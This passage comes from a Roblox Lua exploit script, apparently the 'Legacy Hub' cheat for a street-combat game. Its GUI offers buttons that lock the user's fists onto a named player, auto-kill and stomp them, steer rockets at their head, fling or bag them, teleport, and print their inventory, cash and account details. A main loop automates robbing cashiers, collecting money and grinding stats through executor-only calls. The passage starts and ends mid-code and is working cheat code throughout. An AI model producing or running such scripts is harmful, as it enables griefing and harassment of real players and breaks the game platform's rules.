				Lock.TextColor3 = Color3.fromRGB(255, 255, 255)
				Lock.TextSize = 18.000
				Lock.MouseButton1Click:connect(function()
					if GetShortenedPlrFromName(TextBox.Text) ~= nil then
						for i, v in pairs(GetShortenedPlrFromName(TextBox.Text)) do
							LockedPlayer = v
							break
						end
					end
				end)

				Unlock.Name = "Unlock"
				Unlock.Parent = Target
				Unlock.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				Unlock.BorderColor3 = Color3.fromRGB(35, 35, 35)
				Unlock.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				Unlock.Size = UDim2.new(0, 183, 0, 36)
				Unlock.Font = Enum.Font.GothamSemibold
				Unlock.Text = "Unlock"
				Unlock.TextColor3 = Color3.fromRGB(255, 255, 255)
				Unlock.TextSize = 18.000
				Unlock.MouseButton1Click:connect(function()
					LockedPlayer = nil
					if LocalPlayer ~= nil and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("RightHand") and LocalPlayer.Character:FindFirstChild("RightLowerArm") and LocalPlayer.Character:FindFirstChild("LeftHand") and LocalPlayer.Character:FindFirstChild("LeftLowerArm") and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
						LocalPlayer.Character:FindFirstChild("RightHand").CFrame = LocalPlayer.Character:FindFirstChild("RightLowerArm").CFrame - LocalPlayer.Character:FindFirstChild("RightLowerArm").CFrame.UpVector * 0.25
						LocalPlayer.Character:FindFirstChild("LeftHand").CFrame = LocalPlayer.Character:FindFirstChild("LeftLowerArm").CFrame - LocalPlayer.Character:FindFirstChild("LeftLowerArm").CFrame.UpVector * 0.25
					end
				end)
				game:GetService("RunService").Heartbeat:Connect(function()
					if LockedPlayer ~= nil and LockedPlayer.Character and LockedPlayer.Character:FindFirstChildOfClass("Humanoid") and LockedPlayer.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
						for i, v in pairs(LocalPlayer.Character:GetDescendants()) do
							if v.ClassName == "Motor6D" and (v.Name == "RightWrist" or v.Name == "LeftWrist") then
								v:Destroy()
							end
						end
						if LocalPlayer ~= nil and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("RightHand") and LocalPlayer.Character:FindFirstChild("LeftHand") and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health > 0 then

							if LockedPlayer.Character.PrimaryPart and not LockedPlayer.Character:FindFirstChild("HumanoidRootPart") then
								LocalPlayer.Character.RightHand.CFrame = LockedPlayer.Character.PrimaryPart.CFrame
								LocalPlayer.Character.LeftHand.CFrame = LockedPlayer.Character.PrimaryPart.CFrame
							elseif LockedPlayer.Character:FindFirstChild("HumanoidRootPart") then
								LocalPlayer.Character.RightHand.CFrame = LockedPlayer.Character.HumanoidRootPart.CFrame
								LocalPlayer.Character.LeftHand.CFrame = LockedPlayer.Character.HumanoidRootPart.CFrame
							end

						end
					end
				end)

				RPGLock.Name = "RPGLock"
				RPGLock.Parent = Target
				RPGLock.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				RPGLock.BorderColor3 = Color3.fromRGB(35, 35, 35)
				RPGLock.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				RPGLock.Size = UDim2.new(0, 183, 0, 36)
				RPGLock.Font = Enum.Font.GothamSemibold
				RPGLock.Text = "RPGLock"
				RPGLock.TextColor3 = Color3.fromRGB(255, 255, 255)
				RPGLock.TextSize = 18.000
				RPGLock.MouseButton1Click:connect(function()
					_G.rocketlock0000000 = true
				end)

				RPGUnlock.Name = "RPGUnlock"
				RPGUnlock.Parent = Target
				RPGUnlock.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				RPGUnlock.BorderColor3 = Color3.fromRGB(35, 35, 35)
				RPGUnlock.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				RPGUnlock.Size = UDim2.new(0, 183, 0, 36)
				RPGUnlock.Font = Enum.Font.GothamSemibold
				RPGUnlock.Text = "RPGUnlock"
				RPGUnlock.TextColor3 = Color3.fromRGB(255, 255, 255)
				RPGUnlock.TextSize = 18.000
				RPGUnlock.MouseButton1Click:connect(function()
					_G.rocketlock0000000 = false
				end)

				AutokillOn.Name = "AutokillOn"
				AutokillOn.Parent = Target
				AutokillOn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				AutokillOn.BorderColor3 = Color3.fromRGB(35, 35, 35)
				AutokillOn.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				AutokillOn.Size = UDim2.new(0, 183, 0, 36)
				AutokillOn.Font = Enum.Font.GothamSemibold
				AutokillOn.Text = "AutoKill[On]"
				AutokillOn.TextColor3 = Color3.fromRGB(255, 255, 255)
				AutokillOn.TextSize = 18.000
				AutokillOn.MouseButton1Click:connect(function()
					if GetShortenedPlrFromName(TextBox.Text) ~= nil then
						for i, v in pairs(GetShortenedPlrFromName(TextBox.Text)) do
							locked = v
							game.Workspace.Camera.CameraSubject = game.Players[v.Name].Character.Humanoid
							break
						end
					end
				end)

				AutoKillOff.Name = "AutoKillOff"
				AutoKillOff.Parent = Target
				AutoKillOff.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				AutoKillOff.BorderColor3 = Color3.fromRGB(35, 35, 35)
				AutoKillOff.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				AutoKillOff.Size = UDim2.new(0, 183, 0, 36)
				AutoKillOff.Font = Enum.Font.GothamSemibold
				AutoKillOff.Text = "AutoKill[Off]"
				AutoKillOff.TextColor3 = Color3.fromRGB(255, 255, 255)
				AutoKillOff.TextSize = 18.000
				AutoKillOff.MouseButton1Click:connect(function()
					locked = nil
					if LocalPlayer ~= nil and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("RightHand") and LocalPlayer.Character:FindFirstChild("RightLowerArm") and LocalPlayer.Character:FindFirstChild("LeftHand") and LocalPlayer.Character:FindFirstChild("LeftLowerArm") and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health > 0 then

						game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid

						LocalPlayer.Character:FindFirstChild("RightHand").CFrame = LocalPlayer.Character:FindFirstChild("RightLowerArm").CFrame - LocalPlayer.Character:FindFirstChild("RightLowerArm").CFrame.UpVector * 0.25
						LocalPlayer.Character:FindFirstChild("LeftHand").CFrame = LocalPlayer.Character:FindFirstChild("LeftLowerArm").CFrame - LocalPlayer.Character:FindFirstChild("LeftLowerArm").CFrame.UpVector * 0.25
					end
					local localCharacter    = game:GetService("Players").LocalPlayer.Character;
					local LeftFist          = localCharacter.LeftHand;
					local RightFist         = localCharacter.RightHand;


					local rightwrist  = Instance.new("Motor6D");
					rightwrist.Name   = "RightWrist";
					rightwrist.Parent = localCharacter.RightHand;
					rightwrist.C0     = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1);
					rightwrist.C1     = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
					rightwrist.Part0  = localCharacter.RightLowerArm;
					rightwrist.Part1  = localCharacter.RightHand;

					local leftwrist   = Instance.new("Motor6D");
					leftwrist.Name    = "LeftWrist";
					leftwrist.Parent  = localCharacter.LeftHand;
					leftwrist.C0      = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1);
					leftwrist.C1      = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
					leftwrist.Part0   = localCharacter.LeftLowerArm;
					leftwrist.Part1   = localCharacter.LeftHand;
				end)

				View.Name = "View"
				View.Parent = Target
				View.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				View.BorderColor3 = Color3.fromRGB(35, 35, 35)
				View.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				View.Size = UDim2.new(0, 183, 0, 36)
				View.Font = Enum.Font.GothamSemibold
				View.Text = "View"
				View.TextColor3 = Color3.fromRGB(255, 255, 255)
				View.TextSize = 18.000
				View.MouseButton1Click:connect(function()
					wait()
					local TargetPlr = TextBox.Text;
					game.Workspace.Camera.CameraSubject = game.Players[TargetPlr].Character.Humanoid;
				end)

				Unview.Name = "Unview"
				Unview.Parent = Target
				Unview.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				Unview.BorderColor3 = Color3.fromRGB(35, 35, 35)
				Unview.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				Unview.Size = UDim2.new(0, 183, 0, 36)
				Unview.Font = Enum.Font.GothamSemibold
				Unview.Text = "Unview"
				Unview.TextColor3 = Color3.fromRGB(255, 255, 255)
				Unview.TextSize = 18.000
				Unview.MouseButton1Click:connect(function()
					local LocalPlayer = game:GetService("Players").LocalPlayer
					game.Workspace.Camera.CameraSubject = LocalPlayer.Character.Humanoid;
				end)

				Teleport.Name = "Teleport"
				Teleport.Parent = Target
				Teleport.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				Teleport.BorderColor3 = Color3.fromRGB(35, 35, 35)
				Teleport.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				Teleport.Size = UDim2.new(0, 183, 0, 36)
				Teleport.Font = Enum.Font.GothamSemibold
				Teleport.Text = "Teleport"
				Teleport.TextColor3 = Color3.fromRGB(255, 255, 255)
				Teleport.TextSize = 18.000
				Teleport.MouseButton1Click:connect(function()
					local TargetPlr = TextBox.Text;
					wait(.30)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[TargetPlr].Character.HumanoidRootPart.CFrame
				end)

				Bag.Name = "Bag"
				Bag.Parent = Target
				Bag.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				Bag.BorderColor3 = Color3.fromRGB(35, 35, 35)
				Bag.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				Bag.Size = UDim2.new(0, 183, 0, 36)
				Bag.Font = Enum.Font.GothamSemibold
				Bag.Text = "Bag"
				Bag.TextColor3 = Color3.fromRGB(255, 255, 255)
				Bag.TextSize = 18.000
				Bag.MouseButton1Click:connect(function()
					local TargetPlr = TextBox.Text
					function getRoot(char)
						local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
						return rootPart
					end

					if TargetPlr and game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop['[BrownBag] - $25'].Head.CFrame
						wait()
						fireclickdetector(game.Workspace.Ignored.Shop['[BrownBag] - $25'].ClickDetector)
						game.Players.LocalPlayer.Backpack:WaitForChild("[BrownBag]").Parent = game.Players.LocalPlayer.Character
						wait()
						repeat
							pcall(function()
								wait()
								getRoot(game.Players[TargetPlr].Character).CFrame = getRoot(game.Players.LocalPlayer.Character).CFrame + Vector3.new(1,3,0)
								game.Players.LocalPlayer.Character["[BrownBag]"]:Activate()
							end)
						until game.Players[TargetPlr].Character:FindFirstChild("Christmas_Sock")
					elseif game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
					end
				end)

				Info.Name = "Info"
				Info.Parent = Target
				Info.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				Info.BorderColor3 = Color3.fromRGB(35, 35, 35)
				Info.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				Info.Size = UDim2.new(0, 183, 0, 36)
				Info.Font = Enum.Font.GothamSemibold
				Info.Text = "Info"
				Info.TextColor3 = Color3.fromRGB(255, 255, 255)
				Info.TextSize = 18.000
				Info.MouseButton1Click:connect(function()
					local notifSound = Instance.new("Sound",workspace)
					notifSound.PlaybackSpeed = 1.5
					notifSound.Volume = 0.15
					notifSound.SoundId = "rbxassetid://170765130"
					notifSound.PlayOnRemove = true
					notifSound:Destroy()
					game.StarterGui:SetCore("SendNotification", {Title = "Legacy Hub", Text = "Info Printed To Console", Icon = "rbxassetid://505845268", Duration = 15, Button1 = "Okay"})
					print("------------------")
					print(""..TextBox.Text.." Has:")
					print("------------------")
					for i, v in pairs(game:GetService("Players")[TextBox.Text].Backpack:GetDescendants()) do
						if v:IsA("Tool") then
							print(""..v.Name.."")
						end
					end
					print("------------------")
					print(""..TextBox.Text.." | Information:")
					print("------------------")
					print("Account Age: "..game:GetService("Players")[TextBox.Text].AccountAge)
					print("User ID: "..game:GetService("Players")[TextBox.Text].UserId)
					if game:GetService("Players")[TextBox.Text].DataFolder:FindFirstChild("Currency") then
						print("Cash: $"..comma(game:GetService("Players")[TextBox.Text].DataFolder.Currency.Value))
					end
					if game:GetService("Players")[TextBox.Text].DataFolder.Information:FindFirstChild("Wanted") then
						print("Wanted: "..comma(game:GetService("Players")[TextBox.Text].DataFolder.Information.Wanted.Value))
					end
					if game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("ShoesCollect") then
						print("Shoes Collected: "..comma(game.Players.LocalPlayer.Character.BodyEffects.ShoesCollect.Value))
					end
					if workspace.Players[TextBox.Text]:FindFirstChild("Shirt") then
						print("Shirt Template: "..workspace.Players[TextBox.Text]:FindFirstChild("Shirt").ShirtTemplate)
					end
					if workspace.Players[TextBox.Text]:FindFirstChild("Pants") then
						print("Pants Template: "..workspace.Players[TextBox.Text]:FindFirstChild("Pants").PantsTemplate)
					end
					if game:GetService("Players")[TextBox.Text].DataFolder.Information:FindFirstChild("Crew") then
						print("Crew ID: "..game:GetService("Players")[TextBox.Text].DataFolder.Information.Crew.Value)
					end
					if workspace.Players[TextBox.Text].LowerTorso:FindFirstChild("BOOMBOXSOUND") then
						print("Sound ID: "..workspace.Players[TextBox.Text].LowerTorso.BOOMBOXSOUND.SoundId)
					end
					print("------------------")
				end)

				Fling.Name = "Fling"
				Fling.Parent = Target
				Fling.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				Fling.BorderColor3 = Color3.fromRGB(35, 35, 35)
				Fling.Position = UDim2.new(0.926315784, 0, -0.0240549855, 0)
				Fling.Size = UDim2.new(0, 183, 0, 36)
				Fling.Font = Enum.Font.GothamSemibold
				Fling.Text = "Fling"
				Fling.TextColor3 = Color3.fromRGB(255, 255, 255)
				Fling.TextSize = 18.000
				Fling.MouseButton1Click:connect(function()
					if Fling.Text == "Fling" then
						Fling.Text = "Unfling"
					else
						Fling.Text = "Fling"
					end
					local Loop
					local OldFlingPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
					local loopFunction = function()
						pcall(function()
							local FlingEnemy = game:GetService('Players'):FindFirstChild(TextBox.Text).Character
							if FlingEnemy and game.Players.LocalPlayer.Character then
								FlingTorso = FlingEnemy.UpperTorso
								local dis = 3.85
								local increase = 6
								if FlingEnemy.Humanoid.MoveDirection.X < 0 then
									xchange = -increase
								elseif FlingEnemy.Humanoid.MoveDirection.X > 0  then
									xchange = increase
								else
									xchange = 0
								end
								if FlingEnemy.Humanoid.MoveDirection.Z < 0 then
									zchange = -increase
								elseif FlingEnemy.Humanoid.MoveDirection.Z > 0 then
									zchange = increase
								else
									zchange = 0
								end          
								if game.Players.LocalPlayer.Character then
									game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):ChangeState(11)
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(FlingTorso.Position.X + math.random(-dis,dis) + xchange, FlingTorso.Position.Y, FlingTorso.Position.Z + math.random(-dis,dis) + zchange) * CFrame.Angles(math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.X + 350),math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.Y + 200),math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.Z + 240))
									game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
								end
							end
						end)
					end;
					local Start = function()    
						OldFlingPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
						Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
					end;
					local Pause = function()
						Loop:Disconnect()
						local vectorZero = Vector3.new(0, 0, 0)
						game.Players.LocalPlayer.Character.PrimaryPart.Velocity = vectorZero
						game.Players.LocalPlayer.Character.PrimaryPart.RotVelocity = vectorZero
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(OldFlingPos) * CFrame.Angles(math.rad(0),math.rad(137.92),math.rad(0))
					end;
					Start()
					repeat wait() until Fling.Text == "Fling"
					Pause()
				end)

				TextLabel.Parent = lmao
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.BackgroundTransparency = 1.000
				TextLabel.Position = UDim2.new(0.115789473, 0, 0.0274914093, 0)
				TextLabel.Size = UDim2.new(0, 146, 0, 21)
				TextLabel.Font = Enum.Font.GothamSemibold
				TextLabel.Text = "Legacy Target"
				TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.TextSize = 22.000

				TextButton.Parent = lmao
				TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextButton.BackgroundTransparency = 1.000
				TextButton.Position = UDim2.new(0.884210527, 0, 0, 0)
				TextButton.Size = UDim2.new(0, 21, 0, 20)
				TextButton.Font = Enum.Font.GothamSemibold
				TextButton.Text = "X"
				TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
				TextButton.TextSize = 18.000
				TextButton.MouseButton1Click:connect(function()
					lmao:Destroy()
				end)


				game:GetService("RunService").Heartbeat:Connect(function()
					local target = TextBox.Text
					if locked ~= nil and locked.Character and locked.Character:FindFirstChildOfClass("Humanoid") and locked.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
						for i, v in pairs(LocalPlayer.Character:GetDescendants()) do
							if v.ClassName == "Motor6D" and (v.Name == "RightWrist" or v.Name == "LeftWrist") then
								v:Destroy()
							end
						end
						if locked.Character.PrimaryPart and not locked.Character:FindFirstChild("HumanoidRootPart") then

							LocalPlayer.Character.RightHand.CFrame = locked.Character.PrimaryPart.CFrame -- tp fist lock
							LocalPlayer.Character.LeftHand.CFrame = locked.Character.PrimaryPart.CFrame -- tp fist lock

							if game.Players[target].Character.BodyEffects['K.O'].Value == true then
								repeat
									locked = nil
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Players[target].BodyEffects.SpecialParts.Head.CFrame
									game.ReplicatedStorage.MainEvent:FireServer("Stomp")
									wait()
									if GetShortenedPlrFromName(TextBox.Text) ~= nil then
										for i, v in pairs(GetShortenedPlrFromName(TextBox.Text)) do
											locked = v
											game.Workspace.Camera.CameraSubject = game.Players[v.Name].Character.Humanoid
											break
										end
									end
								until game.Players[target].Character.BodyEffects['K.O'].Value == false
							end

							if game.Players[target].Character.BodyEffects['K.O'].Value == false then
								local tool = game.Players.LocalPlayer.Character:FindFirstChild("Combat")
								wait(0.5)
								tool:Activate()
							end
							wait()
							game.Workspace.Camera.CameraSubject = game.Players[target].Character.Humanoid

						elseif locked.Character:FindFirstChild("HumanoidRootPart") then
							LocalPlayer.Character.RightHand.CFrame = locked.Character.HumanoidRootPart.CFrame -- tp fist lock
							LocalPlayer.Character.LeftHand.CFrame = locked.Character.HumanoidRootPart.CFrame -- tp fist lock

							if game.Players[target].Character.BodyEffects['K.O'].Value == true then
								repeat
									locked = nil
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Players[target].BodyEffects.SpecialParts.Head.CFrame
									game.ReplicatedStorage.MainEvent:FireServer("Stomp")
									wait()
									if GetShortenedPlrFromName(TextBox.Text) ~= nil then
										for i, v in pairs(GetShortenedPlrFromName(TextBox.Text)) do
											locked = v
											game.Workspace.Camera.CameraSubject = game.Players[v.Name].Character.Humanoid
											break
										end
									end
								until game.Players[target].Character.BodyEffects['K.O'].Value == false
							end

							if game.Players[target].Character.BodyEffects['K.O'].Value == false then
								local tool = game.Players.LocalPlayer.Character:FindFirstChild("Combat")
								wait(0.5)
								tool:Activate()
							end
							wait()
							game.Workspace.Camera.CameraSubject = game.Players[target].Character.Humanoid

						end
					end
				end)
				--rpglock
				game:GetService"RunService".RenderStepped:Connect(function()
					if _G.rocketlock0000000 == true then
						local target = TextBox.Text --Put either the player name, or a variable containing the player name
						if game.Workspace.Ignored:FindFirstChild("Launcher")then
							local lol = game.Workspace.Ignored:FindFirstChild("Launcher")
							if lol:FindFirstChildOfClass("BodyVelocity") then
								wait()
								lol.BodyVelocity:Destroy()
							end

							if lol:FindFirstChild("BodyVelocity") == nil then
								lol.CFrame = CFrame.new(workspace.Players[target].Head.CFrame.X,workspace.Players[target].Head.CFrame.Y+6,workspace.Players[target].Head.CFrame.Z)
							end

						elseif game.Workspace.Ignored:FindFirstChild("Handle")then
							local lol = game.Workspace.Ignored:FindFirstChild("Handle")

							if lol:FindFirstChild("Pin") then
								lol.CFrame = CFrame.new(workspace.Players[target].Head.CFrame.X,workspace.Players[target].Head.CFrame.Y+1,workspace.Players[target].Head.CFrame.Z)
							end
						end
					end
				end)
			end;
		end;
		game:GetService('StarterGui'):SetCore("SendNotification", {
			Title = 'Legacy Target';
			Text = 'This notification will only show once.';
			Duration = 3.4028235e+38;
			Callback = bind;
			Button1 = 'Accept';
			Button2 = 'Decline';
		});
	end;
	Target();

	local r = game.Workspace.Cashiers:GetChildren()
	for s = 1, #r do
		local t = r[s]
		t.Name = "CASHIER"..s
	end;
	for u, v in pairs(game.Workspace:GetDescendants()) do
		if v:IsA("Seat") then
			v:Destroy()
		end
	end;
	for w, x in pairs(game.Workspace.MAP.Map["Da Furniture"]:GetChildren()) do
		if x then
			if x.Name == "Part" then
				x.CanCollide = false
			end
		end
	end;
	for y, z in pairs(game.Workspace.MAP.Map["Ubi's Resturant"]:GetChildren()) do
		if z then
			if z.Name == "Part" then
				if z.Size ~= Vector3.new(48, 3.25, 80) then
					z.CanCollide = false
				end
			end
		end
	end;
	for A, B in pairs(game.Workspace.MAP.Map["Gas Station"]["Gas Station"]:GetChildren()) do
		if B then
			if B.Name == "Part" then
				if B.Size ~= Vector3.new(68, 1, 56) then
					B.CanCollide = false
				end
			end
		end
	end;
	function toTarget(d, C, D)
		for E, F in pairs(game.Workspace.Cashiers:GetChildren()) do
			if F:WaitForChild("Humanoid").Health > 0 then
				local CF = F.Open.CFrame
				local LV = CF.lookVector
				game.Workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = CF + (LV * Vector3.new(-1, 0, 0))
				return F
			end
		end
	end;
	function ToShoes(d, C, D)
		local E = game:service"TweenService"
		local F = TweenInfo.new((C - d).Magnitude / 50, Enum.EasingStyle.Quad)
		local G = tick()
		local H, I = pcall(function()
			local H = E:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], F, {
				CFrame = D
			})
			H:Play()
		end)
		if not H then
			return I
		end
	end;
	local function J(K, L)
		local M = (K.Position - L.Position).magnitude;
		if M <= 50 then
			fireclickdetector(L:FindFirstChild("ClickDetector"), 4)
			return M
		end
	end;
	while wait() do
		if _G.FastDropCash then
			game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('DropMoney', _G.FastDropAmount)
		end;
		if _G.AutoCollectCash then
			for _, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
				if v.Name == 'MoneyDrop' and (game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position - v.Position).Magnitude < 25 then
					fireclickdetector(v:FindFirstChildOfClass('ClickDetector'));
				end;
			end;
		end;
		if _G.Rob then
			repeat
				for N, O in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - O.Position).Magnitude <= 50 then
						local P = O;
						J(game.Players.LocalPlayer.Character.HumanoidRootPart, O)
						wait()
					end
				end;
				if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
					local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
					tool.Parent = game.Players.LocalPlayer.Character
				end;
				wait()
				for s, Q in pairs(game.Workspace.Cashiers:GetChildren()) do
					wait()
					if Q:FindFirstChild("Humanoid") then
						if Q.Humanoid.Health > 0 then
							wait()
							if Q.Name ~= "CASHIER5" then
								Q.Wedge.Orientation = Vector3.new(0, 90, 0)
								Q.Wedge.Size = Vector3.new(4, 4, 4)
								Q.Wedge.CanCollide = false
							end;
							if Q.Name == "CASHIER5" then
								Q.Wedge.Orientation = Vector3.new(0, 180, 0)
								Q.Wedge.Size = Vector3.new(4, 4, 4)
								Q.Wedge.CanCollide = false
							end;
							wait()
							poss = Q.Wedge.Position - Vector3.new(0, 0, 0)
							posc = Q.Wedge.CFrame - Vector3.new(-2.5, 0, 0)
							toTarget(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, poss, posc)
							repeat
								wait()
							until (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - poss).Magnitude < 50 or not _G.Rob or Q.Humanoid.Health <= 0;
							repeat
								if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
									local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
									tool.Parent = game.Players.LocalPlayer.Character
								end;
								toTarget(game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position, poss, posc)
								wait(.2)
								game:GetService("VirtualUser"):Button1Down(Vector2.new())
							until Q.Humanoid.Health <= 0 or not _G.Rob;
							wait(.2)
							for R = 5, 50 do
								wait()
								for N, O in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
									if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - O.Position).Magnitude <= 50 then
										if O:IsA("Part") then
											local P = O;
											J(game.Players.LocalPlayer.Character.HumanoidRootPart, O)
											wait()
										end
									end
								end
							end
						end
					end
				end
			until not _G.Rob
		end;
		if _G.Shoe then
			repeat
				for N, O in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - O.Position).Magnitude <= 50 then
						local P = O;
						J(game.Players.LocalPlayer.Character.HumanoidRootPart, O)
						wait()
					end
				end;
				wait()
				for S, T in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
					wait()
					if T:IsA("MeshPart") then
						if T:FindFirstChild("ClickDetector") then
							if game.Players.LocalPlayer.Character.BodyEffects.ShoesCollect.Value < 4 then
								T.Orientation = Vector3.new(0, 0, 0)
								wait()
								posM = T.Position - Vector3.new(0, 0, 0)
								poscM = T.CFrame - Vector3.new(0, -10, 0)
								ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posM, poscM)
								repeat
									wait()
									wait()
								until (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - posM).Magnitude < 50 or not _G.Shoe
							else
								wait()
								local U = game.Workspace.Ignored["Clean the shoes on the floor and come to me for cash"].Head;
								posMV = U.Position - Vector3.new(0, 0, 0)
								poscMV = U.CFrame - Vector3.new(0, -2, 0)
								ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMV, poscMV)
								wait(.3)
								if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - U.Position).Magnitude <= 25 then
									fireclickdetector(U.Parent.ClickDetector)
									wait()
								end
							end
						end
					end
				end
			until not _G.Shoe
		end;
		wait()
		if _G.box then
			repeat
				wait()
				if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
					local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
					tool.Parent = game.Players.LocalPlayer.Character
				end;
				for V, W in pairs(game.Workspace.MAP.Map.ArenaBOX:GetChildren()) do
					wait()
					warn(W)
					if W.Name == "PunchingBagInGame" then
						wait()
						posMx = W:FindFirstChild("pretty ransom").Position - Vector3.new(0, 0, 0)
						poscMx = W:FindFirstChild("pretty ransom").CFrame - Vector3.new(3, 0, 0)
						ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMx, poscMx)
						repeat
							if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
								local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
								tool.Parent = game.Players.LocalPlayer.Character
							end;
							ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMx, poscMx)
							wait(.5)
							game:GetService("VirtualUser"):ClickButton1(Vector2.new())
						until not _G.box
					end
				end
			until not _G.box
		end;
		if _G.muscle then
			repeat
				wait()
				if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
					wait()
					local k = game.Workspace.Ignored.Shop["[HeavyWeights] - $250"]
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
						wait(.8)
						fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
					end
				end;
				if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
					tool = game.Players.LocalPlayer.Backpack:WaitForChild("[HeavyWeights]")
					tool.Parent = game.Players.LocalPlayer.Character
				end;
				game:GetService("VirtualUser"):ClickButton1(Vector2.new())
				local d = Vector3.new(-1006.99, -51.1542, -1014.33)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
			until not _G.muscle
		end;
		if _G.lettuce then
			repeat
				wait()
				if not game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]") then
					wait()
					local k = game.Workspace.Ignored.Shop["[Lettuce] - $5"]
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
